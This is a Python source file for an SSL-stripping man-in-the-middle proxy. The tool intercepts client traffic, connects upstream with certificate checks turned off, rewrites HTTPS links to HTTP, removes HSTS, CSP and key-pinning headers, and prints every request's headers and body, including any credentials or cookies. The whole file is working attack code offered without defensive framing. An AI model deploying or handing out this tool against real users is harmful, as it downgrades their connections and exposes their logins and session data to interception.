import socket
import threading
import re
import ssl
import urllib.parse
from datetime import datetime

class SSLStripper:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.running = False
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def print_packet(self, direction, data, is_request=True):
        """Print packet details in a formatted way"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            direction_arrow = ">>>" if direction == "outgoing" else "<<<"
            packet_type = "REQUEST" if is_request else "RESPONSE"
            
            print("\n" + "="*50)
            print(f"{timestamp} {direction_arrow} {packet_type}")
            print("="*50)
            
            if is_request:
                # Parse and print request details
                try:
                    headers, body = data.split(b'\r\n\r\n', 1)
                    headers = headers.decode('utf-8', errors='ignore')
                    print("Headers:")
                    for line in headers.split('\r\n'):
                        print(f"  {line}")
                    
                    if body:
                        print("\nBody:")
                        try:
                            # Try to decode as UTF-8, fall back to hex dump
                            print(body.decode('utf-8', errors='ignore'))
                        except:
                            print("Binary data:", body.hex()[:100] + "..." if len(body) > 50 else body.hex())
                except Exception as e:
                    print(f"Error parsing request: {e}")
                    print("Raw data:", data)
            else:
                # Parse and print response details
                try:
                    if b'\r\n\r\n' in data:
                        headers, body = data.split(b'\r\n\r\n', 1)
                        headers = headers.decode('utf-8', errors='ignore')
                        print("Headers:")
                        for line in headers.split('\r\n'):
                            print(f"  {line}")
                        
                        if body:
                            print("\nBody preview (first 200 bytes):")
                            try:
                                print(body[:200].decode('utf-8', errors='ignore'))
                                if len(body) > 200:
                                    print("... (truncated)")
                            except:
                                print("Binary data:", body[:100].hex() + "..." if len(body) > 50 else body.hex())
                    else:
                        print("Raw data:", data)
                except Exception as e:
                    print(f"Error parsing response: {e}")
                    print("Raw data:", data)
            
            print("="*50 + "\n")
        except Exception as e:
            print(f"Error printing packet: {e}")

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        self.running = True
        print(f"[+] SSL Stripper running on {self.host}:{self.port}")

        try:
            while self.running:
                client_sock, addr = server.accept()
                print(f"[+] New connection from {addr}")
                thread = threading.Thread(target=self.handle_client, args=(client_sock,))
                thread.daemon = True
                thread.start()
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
        finally:
            self.running = False
            server.close()
            print("[+] Proxy stopped.")

    def handle_client(self, client_socket):
        try:
            # Receive the initial request
            request = self.receive_request(client_socket)
            if not request:
                return

            # Print the incoming request
            self.print_packet("incoming", request, is_request=True)

            # Parse the request
            first_line = request.split(b'\r\n')[0].decode('utf-8')
            headers = self.parse_headers(request)
            
            try:
                method, url, version = first_line.split(' ')
            except ValueError:
                print("[!] Malformed request line")
                return

            parsed_url = urllib.parse.urlparse(url)
            host = headers.get('Host', parsed_url.netloc)
            is_https = parsed_url.scheme == 'https' or ':443' in host
            
            if ':' in host:
                host = host.split(':')[0]

            try:
                if is_https:
                    print("[*] Detected HTTPS connection, downgrading to HTTP")
                    server_socket = self.connect_https(host)
                else:
                    server_socket = self.connect_http(host)
            except Exception as e:
                print(f"[!] Failed to connect to {host}: {e}")
                return

            # Modify and forward the request
            modified_request = self.modify_request(request, headers, parsed_url, is_https)
            
            # Print the outgoing modified request
            self.print_packet("outgoing", modified_request, is_request=True)
            
            server_socket.sendall(modified_request)

            # Handle the response
            while True:
                response = server_socket.recv(8192)
                if not response:
                    break
                
                # Print the incoming response from server
                self.print_packet("incoming", response, is_request=False)
                
                # Modify response - replace HTTPS with HTTP
                modified_response = self.modify_response(response)
                
                # Print the outgoing modified response
                self.print_packet("outgoing", modified_response, is_request=False)
                
                client_socket.sendall(modified_response)

        except Exception as e:
            print(f"[!] Error handling client: {e}")
        finally:
            client_socket.close()
            if 'server_socket' in locals():
                server_socket.close()

    def receive_request(self, sock):
        request = b''
        while True:
            chunk = sock.recv(4096)
            request += chunk
            if b'\r\n\r\n' in request or not chunk:
                break
        return request

    def parse_headers(self, request):
        headers = {}
        try:
            header_lines = request.split(b'\r\n\r\n')[0].decode('utf-8').split('\r\n')[1:]
            for line in header_lines:
                if ': ' in line:
                    key, value = line.split(': ', 1)
                    headers[key] = value
        except Exception as e:
            print(f"[!] Error parsing headers: {e}")
        return headers

    def connect_http(self, host, port=80):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return sock

    def connect_https(self, host, port=443):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        return self.ssl_context.wrap_socket(sock, server_hostname=host)

    def modify_request(self, request, headers, parsed_url, is_https):
        # Convert HTTPS requests to HTTP
        if is_https:
            # Modify the request line to use HTTP
            first_line = request.split(b'\r\n')[0]
            new_first_line = first_line.replace(b'https://', b'http://')
            request = request.replace(first_line, new_first_line)
            
            # Update headers
            if b'Upgrade-Insecure-Requests: 1' in request:
                request = request.replace(b'Upgrade-Insecure-Requests: 1', b'Upgrade-Insecure-Requests: 0')

        return request

    def modify_response(self, response):
        """Strip HTTPS content from response"""
        # Replace HTTPS URLs with HTTP
        modified = re.sub(b'https://', b'http://', response, flags=re.IGNORECASE)
        
        # Remove security headers
        headers_to_remove = [
            b'Strict-Transport-Security',
            b'Content-Security-Policy',
            b'Public-Key-Pins',
        ]
        
        for header in headers_to_remove:
            modified = re.sub(header + b':[^\r\n]*\r\n', b'', modified, flags=re.IGNORECASE)
            
        return modified

if __name__ == '__main__':
    stripper = SSLStripper(host='localhost', port=8080)
    stripper.start()
